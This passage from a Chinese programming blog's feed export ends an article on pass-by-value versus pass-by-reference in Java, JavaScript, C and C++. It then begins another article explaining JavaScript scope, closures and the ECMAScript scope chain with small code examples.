Now that we have some definitions of terms we can return to the question. Does Java pass objects by reference or by value?


The answer is NO! The fact is that Java has no facility whatsoever to pass an object to any function! The reason is that Java has no variables that contain objects.


The reason there is so much confusion is people tend to blur the distinction between an object reference variable and an object instance. All object instances in Java are allocated on the heap and can only be accessed through object references. So if I have the following:


StringBuffer g &#x3D; new StringBuffer( “Hello” );
The variable g does not contain the string “Hello”, it contains a reference (or pointer) to an object instance that contains the string “Hello”.

g 這個變數的值並不是字串Hello，而是一個指到字串 Hello 的 reference，所以你在呼叫 function 的時候，傳進去的就是這個 reference。

我傳進去的是 reference，可是這樣並不叫 call by reference？

聽起來超級無敵奇怪，但根本原因其實是「此 reference 非彼 reference」，我節錄一段Call by value？中的內容：

Java 中 Call by value，指的是傳遞參數時，一律傳遞變數所儲存的值，無論是基本型態或是類別宣告的型態都一樣，Java 中不允許處理記憶體位址，所以用了「參考」這個名稱來作為解釋類別型態所宣告的變數之行為，但這邊的「參考」與 C++ 中所稱之「參考」，是完全不相同的行為，更不會有 C++ 中參數的傳值、傳參考、return 的傳值、傳參考的 Call by reference 行為。 

就是呢，我們傳進去的的確是 reference，但這個 reference 跟 C++ 裡面所稱的「call by reference」其實是不一樣的，所以不能稱作「call by reference」。
這一段其實跟犀牛書裡面11.2. By Value Versus by Reference提到的是差不多的：

Before we leave the topic of manipulating objects and arrays by reference, we need to clear up a point of nomenclature.


The phrase “pass by reference” can have several meanings. To some readers, the phrase refers to a function invocation technique that allows a function to assign new values to its arguments and to have those modified values visible outside the function.
This is not the way the term is used in this book. Here, we mean simply that a reference to an object or array – not the object itself – is passed to a function. A function can use the reference to modify properties of the object or elements of the array. But if the function overwrites the reference with a reference to a new object or array, that modification is not visible outside of the function. 
Readers familiar with the other meaning of this term may prefer to say that objects and arrays are passed by value, but the value that is passed is actually a reference rather than the object itself

不過這個時候我有了另外一個疑問：那 C++ 裡面的 call by reference 到底是怎樣？
嗯，看來是時候複習一下很久沒碰的 C 跟 C++了。
C 與 C++ 的參數傳遞先從 C 開始吧，C 裡面就只有一種：call by value。
#include &lt;stdio.h&gt;  void swap(int a, int b) &#123;  int temp = b;  b = a;  a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;  swap(x, y);  printf(&quot;%d %d\n&quot;, x, y); // 10, 20&#125;

就像我們一開始所說的，這樣子並不會把x跟y的值交換，因為a跟b只是儲存的值跟x與y一樣而已，除此之外一點關係都沒有。
可是呢，我們之前有提到，C 裡面有個東西叫做「指標」，能夠儲存記憶體位置。透過指標我們其實可以在 function 裡面更改外部變數的值。
#include &lt;stdio.h&gt;  void swap(int *a, int *b) &#123;  // 印出 a 跟 b 所存的值  printf(&quot;%ld, %ld&quot;, a, b); //0x44, 0x40  int temp = *b;  *b = *a;  *a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;  // 印出 x 跟 y 的記憶體位置  printf(&quot;%ld %ld\n&quot;, &amp;x, &amp;y); // 0x44, 0x40  swap(&amp;x, &amp;y); // 傳記憶體位置進去  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;

我們這次傳進去 function 的不是一個變數，而是一個記憶體位置，在swap裡面用指標來接受這個記憶體位置，接著就可以透過指標的操作把外面x與y的值改掉。
這樣依然叫做 call by value，如果你還是不清楚為什麼，可以參考下面這個範例。跟上面的差別在於我先宣告兩個指標指向x跟y：
#include &lt;stdio.h&gt;  void swap(int *a, int *b) &#123;    // 印出 a 跟 b 所存的值  printf(&quot;%ld, %ld&quot;, a, b); //0x44, 0x40  int temp = *b;  *b = *a;  *a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;      // 兩個指標指向 x 跟 y  int* ptr_x = &amp;x;  int* ptr_y = &amp;y;    // 印出 x 跟 y 的記憶體位置（就是 ptr_x 跟 ptr_y 存的值）  printf(&quot;%ld %ld\n&quot;, ptr_x, ptr_y); // 0x44, 0x40  swap(ptr_x, ptr_y); // 傳記憶體位置進去  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;


還記得前面說過的 call by value 的定義嗎？就是把變數的值複製一份傳進去。這邊也是一樣的，我們傳進去的兩個變數ptr_x跟ptr_y儲存了x跟y的記憶體位置，而我們在呼叫 function 的時候就把這兩個「值」給複製一份傳進去，所以 function 裡面的a跟b印出來的值就會跟ptr_x以及ptr_y存的值一樣。
簡單來說就是以前我們 call by value 的「value」可能是數字，可能是字串，而現在的範例這個 value 是「記憶體位置」，也是資料型態的一種。
不過，也有人把這樣子稱為 call by pointer 或是 call by address，但原則上都是 call by value 的一種。
在這邊還有一個可以特別注意的地方，那就是儘管a跟ptr_x的「值」一樣，但這兩個還是不一樣的變數，有著不同的記憶體位置。
再來我們看 C++ 中的 call by reference 到底是怎樣，只要在 function 的引數那裡加上&amp;，就會變成 call by reference：
#include &lt;stdio.h&gt;  // 注意到這邊多了 &amp;，其他都跟 call by value 一模一樣void swap(int &amp;a, int &amp;b) &#123;    // 印出 a 跟 b 所存的值與記憶體位置  printf(&quot;%ld, %ld\n&quot;, a, b); // 10, 20  printf(&quot;%ld, %ld\n&quot;, &amp;a, &amp;b); // 0x44, 0x40  int temp = b;  b = a;  a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;    // 印出 x 跟 y 的記憶體位置  printf(&quot;%ld %ld\n&quot;, &amp;x, &amp;y); // 0x44, 0x40  swap(x, y); // 傳記憶體位置進去  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;

在這裡a跟b的記憶體位置與x跟y一模一樣，說明了在裡面操作a這個變數的時候，就是在操作x這個變數，兩者是一模一樣的，只是有了不同的名稱。當a重新賦值的時候，也會一併把外面x的值一起改掉。
看完了 C 跟 C++ 裡面 pass by value 跟 pass by reference 的區別，我開頭的疑惑：「如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？」就被解決了。
我認為這兩個最大的差異就在於一件事情：複製。
call by value 會把傳進去的值複製（無論那個值是數字也好，記憶體位置也好，都會複製一份），call by reference 在「最底層的實作」上當然也會有類似的行為，但是你感覺不出來。
就像我上面 call by reference 舉例的那段程式碼一樣，x的記憶體位置跟a一樣，y的記憶體位置跟b一樣，因此你可以說他們兩者是「一模一樣」的東西。
可是在 call by value 的範例中，就算你傳的是指標好了，只有「指標裡面存的值（也就是指到的記憶體位置）」是一樣的，但指標本身還是有不同的記憶體位置。
換句話說，在 call by value 的時候我們是「新建了一個變數a，並且讓a存的值跟傳進來的參數一樣」。在 call by reference 的時候，我們只是「讓a作為x的 alias，兩個是同樣的變數」，這是我認為這兩間之間最大的差異。
結論我們從各個程式語言裡面看到了每一種程式語言的實現，那到底有沒有一種明確的定義，能夠區分 pass by value 以及 pass by reference 呢？
我想了想，其實可以從「行為」上面來判別到底是屬於哪一種。與其由定義來看，不如直接從行為來加以區分，不同種類能夠達成的行為都不一樣。第一個條件用來區分到底是 pass by value 還是 pass by reference：「在函式裡對引數重新賦值，外面變數是否會改變？」
以 JavaScript 跟 Java 為例，在函式裡面重新賦值，外面的變數都不會變，所以就是屬於 pass by value。
如果你還想分得更細，來可以透過第二個條件來區分這個 pass by value 是真・pass by value 還是一個叫做 pass by sharing 的分支：「能否透過引數，改變外部變數的值」（我們這邊所指的「值」跟地址或引用無關，純粹在講像&#123;numer:1&#125;這樣子的值）
在 JavaScript 跟 Java 你都可以透過obj.number = 10之類的操作改變外部變數的值（obj.number 從 1 變成了 10），所以也能說是 pass by sharing。

根據第一個定義：「在函式裡對引數重新賦值，外面變數是否會改變？」，有人可能會發現如果是 C 裡面的指標，不是也可以達成嗎？可是 C 又說只有 call by value，不就衝突了嗎？
但其實在指標的範例裡面，我們重新賦值的對象是*a而不是a（意思就是，我們是讓*a=10而不是a=10），但後者才叫對引數重新賦值（給a一個新的地址），前者是「對指標所指向的記憶體位置重新賦值」。所以照這個定義來看，指標的範例依舊是 pass by value。
依據細分程度的不同，下面幾句話都是正確的：

JavaScript 裡面只有 pass by value
JavaScript 的 primitive type 是 pass by value，object 是 pass by sharing

心得說實在的，其實我查了這麼一大堆資料之後，發現大家對 call by reference 以及 call by value 的「定義」其實都不盡相同，而且也沒有一個權威性的出處能夠保證這個定義是正確的（或許有但我沒找到，如果你知道的話請一定要告訴我在哪裡，拜託），才造成這麼多的歧異性。
有關技術名詞的解釋，我最喜歡引用這篇：技術名詞紛爭多：

程式開發的世界中，名詞的創造經常是隨意的，曾經在 Java 中爭執不斷的考古題之一是：「Java 中有沒有 Pass by reference」，就現今來說，大家公認的答案是沒有，Java 只有 Pass by value，不過還是有人面對 Java 文件中經常出現 reference，而搞不清楚。


說穿了，這個名詞與 C++ 中的 reference 定義不同，只不過 Java 最初不知道為什麼，也用了 reference 一詞，重點也不在搞清楚 Pass by value，重點是搞清楚透過參數操作物件時，會有什麼樣的行為。

我們從 JavaScript 研究到 Java，再從 Java 研究到 C 與 C++，為的就是想要搞清楚「pass by reference」的定義為何，但追根究底，會造成這樣子的誤會是因為對於「reference」一詞的定義不同。
如果你把 pass by reference 理解成像 C++ 那樣子的定義，那 Java 跟 JavaScript 都不會有 pass by reference。但如果你把 pass by reference 的「reference」理解成「對於物件的參考」，那 JavaScript 把 object 傳進去，其實就是把「對物件的參考」傳進去，那就可以解釋成是 pass by reference。
都是 reference 這個名詞太好用了，導致不同地方有不同的定義，但那些定義往往相似卻又不全然相同。
可是別忘了，重點其實不在這個，而是搞清楚到底參數在操作的時候會有怎樣的行為。你要知道 JavaScript 傳 object 進去的時候，可以更改原本物件的值，但重新賦值並不會影響到外部的 object。只要知道這一點，其他的我覺得都沒那麼重要了。
這次寫了一個很容易引戰的主題，但也覺得滿有趣的，如果你對這問題有不同的見解，覺得我有哪邊寫錯的話，歡迎指正，感謝。
參考資料
[Javascript] 關於 JS 中的淺拷貝和深拷貝

[筆記] 談談JavaScript中by reference和by value的重要觀念
重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？
Re: [問題] 請問傳參考到底是什麼?
ECMA-262-3 in detail. Chapter 8. Evaluation strategy.
簡單介紹JavaScript參數傳遞
JavaScript 是传值调用还是传引用调用？
Values vs References semantics #160
You Don’t Know JS: Types &amp; Grammar Chapter 2: Values

Parameter passing in Java - by reference or by value?
Is Java “pass-by-reference” or “pass-by-value”?
傳值呼叫
Call by value？
java中的经典问题：传值与传引用
Java is Pass-by-Value, Dammit!
11.2. By Value Versus by Reference

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>所有的函式都是閉包：談 JS 中的作用域與 Closure</title>
    <url>/2018/12/08/javascript-closure/</url>
    <content><![CDATA[在正文開始前先幫自己小小工商一下，前陣子把自己以前寫過的文章都放到了 GitHub 上面，那邊比較方便整理文章以及回應，如果有想討論的可以在這篇文章的 GitHub 版本下面留言，想收到新文章通知的也可以按個 watch，感謝。
前言請先原諒我用了一個比較聳動的標題，因為實在是想不到還有什麼標題好下，最後選擇了一個可能比較有爭議的標題，但能利用這樣的標題激起討論也是滿有趣的，何況我說這話也是有根據的。
在觀看此篇文章之前請先看過上一篇：我知道你懂 hoisting，可是你了解到多深？，因為文章內容有部分相關，所以必須先有 Execution Context 以及 Variable Object 的觀念以後，才能夠吸收這篇文章的東西。
如果你只對文章標題的那句：「所有的函式都是閉包」有興趣，那可以直接往下拉，因為要講閉包就必須先從作用域開始講起，所以這篇文章按照慣例不會太短，前面也會有一定程度的鋪陳。
好，讓我們從作用域開始吧。
作用域（Scope）什麼是作用域（或也有人翻做：範疇）？
我自己最喜歡的解釋是：「作用域就是一個變數的生存範圍，一旦出了這個範圍，就無法存取到這個變數」。
來看一個簡單的例子：
function test()&#123;  var a = 10&#125;console.log(a) // Uncaught ReferenceError: a is not defined

在 ES6 以前，唯一產生作用域的方法就是 function，每一個 function 都有自己的作用域，在作用域外面你就存取不到這個 function 內部所定義的變數。然而 ES6 的時候引入了 let 跟 const，多了 block 的作用域，但那不是本文的重點所在，所以我就先這樣帶過了。
除了這種 function 的作用域以外，還有一種叫做作用域是 global 的，其實就是我們常在說的「全域」，或者是「全域變數」，任何地方都能夠存取到，如下範例：
var I_am_global = 123function test() &#123;  console.log(I_am_global) // 123&#125;test()

從上面的範例中你可以發現一件有趣的事情，那就是你在 function 裡面可以存取外面的變數，可是你從外面卻進不去 function 裡面，這邊我要引用之前看到的一個很有趣的解釋方法，這篇文章把作用域比喻成明星，把函式比喻成地區。
全域變數就是國際巨星，例如說湯姆克魯斯，無論到哪裡大家都認識這個人，因為實在是太紅了。而 function 裡面的變數就像是你那個很會唱歌的鄰居，整個社區都知道它的存在，但一但出了這個社區（超過了這個 function），就沒人認識他是誰。
所以 function 一層層的結構就像是地區那樣，最外層是地球、再來五大洲、亞洲、臺灣、台北市、大安區、大安森林公園，在大安森林公園運動的人知道那邊常在慢跑的朋友，也知道台北市內的名人，可是居住在台北市的人卻不一定知道大安區的區長是誰，因為那超出了它的範圍。
把上面的說法轉成程式碼就會變成這樣：
function taiwan() &#123;  var taiwan_star = &#x27;taiwan_star&#x27;  function taipei() &#123;    function daan() &#123;      var daan_star = &#x27;daan_star&#x27;      console.log(taiwan_star) // taiwan_star    &#125;    daan()    console.log(daan_star) // Uncaught ReferenceError: daan_star is not defined  &#125;  taipei()&#125;taiwan()

所以你現在對作用域這個詞應該比較能夠理解了，就是一個變數的生存範圍，一但超過那個範圍就存取不到，而這個範圍就是 function 本身及其內部，所以你在 function 裡面宣告了一個變數，function 外是沒辦法存取的。
外面存取不到裡面的，但「內層」可以存取到「外層」的東西：
function test() &#123;  var a = 100  function inner() &#123;    console.log(a) // 100  &#125;  inner()&#125;test()

對於inner這個 function 來說，a並不是它自己的變數，而這種不在自己作用域中，也不是被當成參數傳進來的變數，就可以稱作 free variable，可以翻做自由變數（聽起來滿酷的）。
對 inner 來說，a 就是一個自由變數。
那 a 的值會是什麼？
因為在 inner 這個作用域裡面找不到 a，就會去上一層 test 的作用域裡面尋找，如果還是找不到，就會再往上一層直到找到為止，所以你可以發現這樣會構成一個「作用域鏈」，inner function scope -&gt; test function scope -&gt; global scope，不斷在這條鏈往上找，如果最後還是找不到就拋出錯誤。
講到這邊基本的概念應該都有了，再來我要出一個問題把你的認知重新打亂並混淆你：
var a = 100function echo() &#123;  console.log(a) // 100 or 200?&#125;  function test() &#123;  var a = 200  echo()&#125;  test()

請問最後 log 出來的 a 應該會是 100 還是 200？
我知道！是 100，因為全域變數裡面的 a 是 100…等等，可是我在 test 裡面的時候又宣告了一個叫 a 的變數並設為 200，echo 裡面的這個 a 好像也可能是 200…好混亂。
答案是 100，你只要掌握我們之前說的那些原則就行了，echo 裡面的那個 a 就是 global 的那個 a，跟 test 裡面的 a 一點關係都沒有。
但你會被混淆也是非常合理的事情，因為在某些程式語言裡面，a 的確會是 200 喔！a 最後出來的值（或換句話說，如何決定自由變數的值）跟程式語言如何決定「作用域」這件事情有關係。
其實我們一開始介紹的這種方法，叫做靜態作用域（static scope），為什麼叫做靜態？就代表作用域跟這個 function 在哪裡被「呼叫」一點關係都沒有，你用肉眼看程式碼的結構就可以看出來它的作用域是什麼，而且是不會變的。
舉例來說，上面那個範例印出來的 a 就會是 global 的 a，儘管我在 test 裡面宣告了另外一個 a 並且呼叫 echo 這個 function，但這跟作用域一點關係都沒有，靜態作用域是在 function 被「宣告」的時候就決定了，而不是 function 被「執行」的時候。
相對地，有靜態作用域就有動態作用域（dynamic scope），如果這個程式語言是採用動態作用域，那最後 log 出來的值就會是 200 而不是 100；換句話說，echo 這個 function 裡面的 a 的值是在程式執行時期才被動態決定的，你只看程式碼的結構沒辦法決定 a 到底是什麼值。
而 JavaScript 的作用域是採用前者，靜態作用域，所以你分析程式碼的結構就可以知道作用域的長相。這邊順帶一提的是 JavaScript 裡面最難解的問題之一：this，其實原理跟動態作用域有異曲同工之妙，那就是 this 的值也是程式執行時才被動態決定的，這也是為什麼一大堆人會搞不清楚它的值是什麼，因為會變來變去的。
靜態作用域其實更學術的名詞叫做 lexical scope，我有看過有人翻成語彙範疇，有人則是翻成詞法作用域。
要理解什麼是 lexical，你必須先知道一點 compiler 的運作原理。在編譯的時候有幾個步驟是用程式去 parse 你的程式碼並且解析，而其中一個步驟就叫做 Lexical Analysis（詞法分析或語彙分析），其實就是去正確分析出程式碼裡面的每一個詞。
我舉一個例子好了，例如說 a = 13 + 2這一個句子，經過詞法分析之後可能就會變成：a、=、13、+、2，這樣子的分組，就先理解到這邊就好，想知道更多編譯器的細節請自行參考相關書籍或文章，或等我有一天把這個基礎補足之後再來用白話文跟大家分享。
所以會叫做 lexical scope 的原因就是在編譯的時候其實就能決定作用域是什麼，才有了這樣子的一個名稱。
跟作用域相關的內容就到這裡了，幫大家複習幾個關鍵字：

作用域鏈 scope chain
自由變數 free variable
靜態作用域 static scope（lexical scope）
動態作用域 dynamic scope

閉包（Closure）再來終於要進入到閉包的相關內容了，在這之前我先介紹一下大家印象中的閉包大概是什麼樣子，然後又具備了什麼樣的特性。
請看以下範例程式碼：
function test() &#123;  var a = 10  function inner() &#123;    console.log(a) // 10  &#125;  inner()&#125;  test()

沒什麼特別的，就只是執行一個內部的 function 而已。但如果我們現在不要直接執行 inner，而是把這個 function 回傳呢？
function test() &#123;  var a = 10  function inner() &#123;    console.log(a) // 還是 10  &#125;  return inner&#125;  var inner = test()inner()

神奇的事情發生了，那就是程式碼依舊輸出了 10。
神奇在哪裡？神奇在一個 function 執行完成以後本來會把所有相關的資源釋放掉，可是我 test 已經執行結束了，照理來說變數 a 的記憶體空間也被釋放，但我呼叫 inner 的時候居然還存取得到 a！
換句話說，a 這個變數被「關在」inner 這個 function 裡面了，所以只要 inner 還存在的一天，a 就永無安寧，只能一直被關在裡面。
而事情的主因就是我在 function 裡面回傳了一個 function，才能造成這種明明執行完畢卻還有東西被關住的現象，而這種情形就是一般人所熟知的閉包，Closure。
那閉包的好處有什麼？優點之一就是能把變數隱藏在裡面讓外部存取不到，舉例來說我有個紀錄餘額的變數跟一個扣款的 function，但我有設置了一個上限，那就是最高只能扣 10 塊：
var my_balance = 999function deduct(n) &#123;  my_balance -= (n &gt; 10 ? 10 : n) // 超過 10 塊只扣 10 塊&#125;  deduct(13) // 只被扣 10 塊my_balance -= 999 // 還是被扣了 999 塊

儘管我們寫了 deduct 這個 function 來操作，但變數還是暴露在外部，任何人都可以直接來改這個變數。這時如果我們利用閉包來改寫，世界就不一樣了：
function getWallet() &#123;  var my_balance = 999  return &#123;    deduct: function(n) &#123;      my_balance -= (n &gt; 10 ? 10 : n) // 超過 10 塊只扣 10 塊    &#125;  &#125;&#125;  var wallet = getWallet()wallet.deduct(13) // 只被扣 10 塊my_balance -= 999 // Uncaught ReferenceError: my_balance is not defined

因為我把餘額這個變數給藏在 function 裡面，所以外部是存取不到的，你想要修改只能夠利用我暴露出去的 deduct 這個函式，這樣子就達到了隱藏資訊的目的，確保這個變數不會隨意地被改到。
但比起這個閉包的用法，我相信有很多人應該都是從底下這個慘痛的經驗才知道有閉包這個東西：
var btn = document.querySelectorAll(&#x27;button&#x27;)for(var i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;

假設頁面上有五個按鈕，我想要第一個按下去時彈出 0，第二個按下去時彈出 1，以此類推，於是寫了上面的程式碼，看起來十分合理。
誰知道我一點下去按鈕，靠腰勒為什麼每一個按鈕都彈出 5，都彈出一樣的數字就夠詭異了，5 到底是從哪來的啊？
包括我自己也是有類似的經驗才意識到自己對作用域以及閉包不太熟悉，現在有了經驗之後再回頭來看上面這段程式碼就能夠完全理解了。
首先，上面的迴圈你以為是這樣子：
btn[0].addEventListener(&#x27;click&#x27;, function() &#123;  alert(0)&#125;)  btn[1].addEventListener(&#x27;click&#x27;, function() &#123;  alert(1)&#125;)  ...

但其實是這樣子：
btn[0].addEventListener(&#x27;click&#x27;, function() &#123;  alert(i)&#125;)  btn[1].addEventListener(&#x27;click&#x27;, function() &#123;  alert(i)&#125;)  ...

仔細想想你會發現下面比較合理，我本來就是幫它加一個 function 是按下去的時候會跳出 i 而已，我又沒有直接執行這個 function。
所以當使用者按按鈕的時候，畫面就會跳出 i，那這個 i 的值會是什麼？因為你按按鈕的時候迴圈已經跑完了，所以 i 早已變成 5（迴圈的最後一圈，i 加一變成 5，判斷不符合 i&lt;&#x3D;4 這個條件所以跳出迴圈），畫面也就跳出數字 5 了。
我加上的這幾個 function，本身都沒有 i 這個變數，所以往作用域的外層去尋找，就找到上面迴圈的那個變數 i 了，因此這幾個 function 所指涉到的 i 是同一個 i。
那應該怎麼解決這個問題呢？加上 function！
function getAlert(num) &#123;  return function() &#123;    alert(num)  &#125;&#125;for(var i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, getAlert(i))&#125;

這邊要注意的是 getAlert(i) 會「回傳」一個跳出 i 的 function，因此我額外產生了五個新的 function，每一個 function 裡面都有自己該跳出的值。
或是你要耍帥的話就這樣寫：
for(var i=0; i&lt;=4; i++) &#123;  (function(num) &#123;    btn[i].addEventListener(&#x27;click&#x27;, function() &#123;      alert(num)    &#125;)  &#125;)(i)&#125;

利用 IIFE（Immediately Invoked Function Expression）把一個 function 包起來並傳入 i 立即執行，所以迴圈每跑一圈其實就會立刻呼叫一個新的 function，因此就產生了新的作用域。
以上如果你都覺得太麻煩不想用，恭喜，在 ES6 裡面有了 block scope 以後，你只要簡單地把迴圈裡面用的 var 改成 let 就行了：
for(let i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;

因為 let 的特性，所以其實迴圈每跑一圈都會產生一個新的作用域，因此 alert 出來的值就會是你想要的那個值。如果你還是覺得有點疑惑，你可以把迴圈看成這樣：
&#123; // 塊級作用域  let i=0  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;&#123; // 塊級作用域  let i=1  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;...

說到這邊我們對閉包有了初步的理解，但對於「什麼是閉包」這個問題似乎還沒有一個明確的定義，「閉包就是可以把值關在裡面的 function」聽起來怪怪的，如果你去找維基百科，他會跟你說：

在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。

如果去找英文的維基百科，可以看到它寫著：

Operationally, a closure is a record storing a function together with an environment

好，看起來還是有點霧煞煞，但總之對於閉包的定義先在此打住，大家心中有個模糊的概念就好，我們晚點再回來處理。
在這個段落我們知道了閉包可以實際應用在哪裡，也理解了閉包可以存取到應該被釋放的值（但卻因為閉包的存在無法被釋放），再來我們來看看 ECMAScript 是如何講述作用域的。
ECMAScript 中的作用域在開始之前，如果你忘記我們之前講的運作模型，請回去我知道你懂 hoisting，可是你了解到多深？複習一下，因為我們等等會用到。
在這邊我一樣用篇幅較少的 ES3 來當範例，要注意的是 ES6 以後很多名詞變得不一樣了，但原理大致上是相通的。
上次我們在10.1.3 Variable Instantiation的章節看到了 hoisting 相關的東西，這次我們要看的則是下一個段落而已，也就是10.1.4 Scope Chain and Identifier Resolution。

Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. When control enters an execution context, a scope chain is created and populated with an initial set of objects, depending on the type of code.

每個 EC 都有自己的 scope chain，當進入 EC 的時候 scope chain 會被建立。
接著我們來看10.2 Entering An Execution Context底下的10.2.3 Function Code：

The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object.

這一段描述了 scope chain 的內容到底是什麼，它講說當進入 EC 的時候，scope chain 會被初始化為 activation object 並加上 function 的[[Scope]]這個屬性。
以上段落其實要講的事情只有一個，就是在進入 EC 的時候會做下面這件事：
scope chain = activation object + [[Scope]]

接著要處理的是兩個問題：什麼是 activation object（以下簡稱 AO），什麼又是[[Scope]]？
在10.1.6 Activation Object可以找到 AO 的解釋：

When control enters an execution context for function code, an object called the activation object is created and associated with the execution context.
The activation object is initialised with a property with name arguments and attributes { DontDelete }
The activation object is then used as the variable object for the purposes of variable instantiation.

這邊提到When control enters an execution context for function code，意思就是只有在進入「函式」的時候會產生這個 AO，而之後 AO 便被當作 VO 拿去使用。
所以什麼是 AO？你可以把它直接當作 VO 的另外一種特別的型態，只在 function 的 EC 中出現，所以在 global 的時候我們有 VO，在 function 內的時候我們有 AO，但是做的事情都是一樣的，那就是會把一些相關的資訊放在裡面。
差別在哪裡？差別在於 AO 裡面會有一個arguments，畢竟是給 function 用的嘛，一定要存這個，其餘地方都是差不多的。如果你偷懶把 VO 跟 AO 這兩個詞混在一起使用，我覺得也是可以接受的，因為差別真的太細微了。
解決了 AO 的問題之後，那什麼是[[Scope]]？在13.2 Creating Function Objects的部分可以看到更詳細的解釋：

Given an optional parameter list specified by FormalParameterList, a body specified by FunctionBody, and a scope chain specified by Scope, a Function object is constructed as follows
（中間省略）
7.Set the [[Scope]] property of F to a new scope chain (10.1.4) that contains the same objects as Scope.

就是說你在建立 function 的時候會給一個 Scope，而這一個 Scope 會被設定到[[Scope]]去。
那在建立 function 時給的 Scope 是什麼？還能有什麼，當然就是當前 EC 的 Scope。
這樣一段段看完之後其實我們可以整理出這樣的一個流程：

當 function A 建立時，設置A.[[Scope]] = scope chain of current EC
當進入一個 function A 時，產生一個新的 EC，並設置EC.scope_chain = AO + A.[[Scope]]

想要完全搞清楚，就讓我們實際再來跑一遍這整個流程就行了，我們用下面這個非常簡單的程式碼作為範例：
var v1 = 10function test() &#123;  var vTest = 20  function inner() &#123;    console.log(v1, vTest) //10 20  &#125;  return inner&#125;var inner = test()inner()

第一步：進入 Global EC現在進入 Global EC 並且初始化 VO 以及 scope chain，前面有講過scope chain = activation object + [[Scope]]，但因為這不是一個 function 所以沒有[[Scope]]，而沒有 AO 就直接拿 VO 來用。總之，最後 Global EC 會是這樣：
globalEC = &#123;  VO: &#123;   v1: undefined,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;

VO 的部分就按照之前講過的初始化，現在唯一多的步驟是多出了 scopeChain 這個屬性，而按照定義，scope chain 就是 globalEC 自己的 VO&#x2F;AO。
這邊別忘了還有最後一步，那就是要設置 function 的[[Scope]]，所以 test 這個 function 的[[Scope]]就會是globalEC.scopeChain也就是globalEC.VO。
第二步：執行程式碼再來第二步執行程式碼，跑了var v1 = 10之後碰到var inner = test()，這邊要準備進入到 test 的 EC 了，在進入前我們現在的資訊長這樣：
globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  test.[[Scope]] = globalEC.scopeChain

第三步：進入 test EC按照慣例，進入的時候先把 test EC 跟 AO 建立起來，然後記得scope chain = activation object + [[Scope]]
testEC = &#123;  AO: &#123;    arguments,    vTest: undefined,    inner: function  &#125;,  scopeChain:   	[testEC.AO, test.[[Scope]]]  = [testEC.AO, globalEC.scopeChain]  = [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  test.[[Scope]] = globalEC.scopeChain

可以看到的是 testEC 的 scope chain 就是自己的 AO 加上之前設置過的[[Scope]]，然後說穿了，其實 scope chain 就是上層的 EC 的 VO 嘛！只是我們用了比較複雜的程序去設置這件事情，但本質上其實就是 VO&#x2F;AO 的組合。
最後別忘記設置 inner 的 scope，inner.[[Scope]] = testEC.scopeChain。
第四步：執行 test 中的程式碼其實也就只跑了var vTest = 20跟return inner，執行完以後變成這樣：
testEC = &#123;  AO: &#123;    arguments,    vTest: 20,    inner: function  &#125;,  scopeChain: [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO]

接著把 inner 回傳回去，而test這個 function 就結束了，照理來說資源應該要被釋放才對。
可是！你有沒有發現現在inner.[[Scope]]記著testEC.AO？因為有人還需要它，所以它沒辦法就這樣被釋放，僅管 test 結束了，testEC.AO 還是存在於記憶體裡面。
第五步：進入 inner EC這邊就不贅述了，就按照同樣的原則去做初始化：
innerEC = &#123;  AO: &#123;    arguments  &#125;,  scopeChain:  [innerEC.AO, inner.[[Scope]]]= [innerEC.AO, testEC.scopeChain]= [innerEC.AO, testEC.AO, globalEC.VO]&#125;  testEC = &#123;  AO: &#123;    arguments,    vTest: 20,    inner: function  &#125;,  scopeChain: [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO]

有沒有發現就跟我剛才講的一樣，其實 scope chain 說穿了就是 VO&#x2F;AO 的組合而已。
第六步：執行 inner從 scope chain 裡面尋找 v1 跟 vTest 這兩個變數，在自己的 AO 裡面找不到所以往上找，找到 testEC.AO 並尋獲 vTest，但 v1 還是沒找到所以又往上一層去看 globalEC.VO，最後找到 v1，成功獲得這兩個變數的值並印出。
結束。
上面的流程講得較為詳細，可以自己再開個小視窗在旁邊搭配著程式碼一起看，一步步來看相信會比較容易理解。其實在上次討論 hoisting 的時候就已經講過這個模型了，而今天只是補充上次沒講到的部分，那就是 scope chain，加上去之後這個模型就完整許多，不但能解釋 hoisting，也能解釋為什麼 function 執行結束以後還可以存取的到那些變數。
